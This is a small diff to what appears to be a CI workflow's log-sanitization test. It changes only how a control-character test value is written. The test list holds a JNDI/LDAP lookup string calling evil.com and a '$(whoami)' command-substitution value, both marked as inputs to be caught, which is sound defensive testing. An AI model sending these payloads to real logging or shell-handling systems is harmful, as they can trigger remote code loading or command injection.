@@ -185,7 +185,7 @@ jobs:
             ('${jndi:ldap://evil.com}', True),
             ('$(whoami)', True),
             ('Regular domain.com', False),
-            ('\x00\x01\x02', True)  # Control characters
+            (chr(0) + chr(1) + chr(2), True)  # Control characters
         ]
         
         print('Testing log sanitization...')
